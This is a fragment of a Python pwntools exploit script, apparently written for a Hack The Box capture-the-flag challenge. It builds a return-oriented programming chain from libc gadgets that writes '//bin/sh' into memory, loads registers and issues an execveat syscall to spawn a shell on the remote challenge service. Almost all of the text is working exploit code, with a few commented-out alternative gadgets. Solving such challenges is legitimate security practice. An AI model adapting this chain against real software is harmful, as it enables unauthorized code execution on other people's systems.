...
# r = process('./dd3')
r = remote('docker.hackthebox.eu', 32651)
...
rop += rebase_0(0x000000000003148f) # 0x000000000003148f: nop; ret; 
rop += rebase_0(0x000000000003148f) # 0x000000000003148f: nop; ret; 

rop += rebase_0(0x0000000000030e4d) # 0x0000000000030e4d: pop r12; ret; 
rop += '//bin/sh'
rop += rebase_0(0x0000000000026a25) # 0x0000000000026a25: pop r13; ret; 
rop += rebase_0(0x00000000001e41a0)
rop += rebase_0(0x00000000000a0da8) # 0x00000000000a0da8: mov qword ptr [r13], r12; pop r12; pop r13; pop r14; ret; 
...
rop += rebase_0(0x0000000000026a25) # 0x0000000000026a25: pop r13; ret; 
rop += rebase_0(0x00000000001e41a8)
rop += rebase_0(0x00000000000a0da8) # 0x00000000000a0da8: mov qword ptr [r13], r12; pop r12; pop r13; pop r14; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000026542) # 0x0000000000026542: pop rdi; ret; 
rop += b'//bin/sh' #p64(0x0)
rop += rebase_0(0x0000000000026f9e) # 0x0000000000026f9e: pop rsi; ret; 
rop += rebase_0(0x00000000001e41a0)
rop += rebase_0(0x000000000012bda6) # 0x000000000012bda6: pop rdx; ret; 
rop += p64(0x0)

rop += rebase_0(0x000000000012bda5) # 0x000000000012bda5: pop r10; ret; 
rop+= p64(0x0)
rop += rebase_0(0x000000000010b31e) # 0x000000000010b31e: pop rcx; ret; 
rop+= p64(0x0)

# rop += rebase_0(0x0000000000047cf8) # 0x0000000000047cf8: pop rax; ret; 
# rop += p64(0x00000000001e41a8)
# rop += rebase_0(0x00000000001e41a8) # 0x000000000014cb21: pop r8; sub byte ptr [rax], al; add byte ptr [rax], al; pop rbp; pop r12; ret;                                                                           
# rop += p64(0x0)
# rop += p64(0x0)
# rop += p64(0x0)
...
rop += rebase_0(0x0000000000047cf8) # 0x0000000000047cf8: pop rax; ret; 
rop += p64(0x142)
rop += rebase_0(0x00000000000cf6c5) # 0x00000000000cf6c5: syscall; ret; 
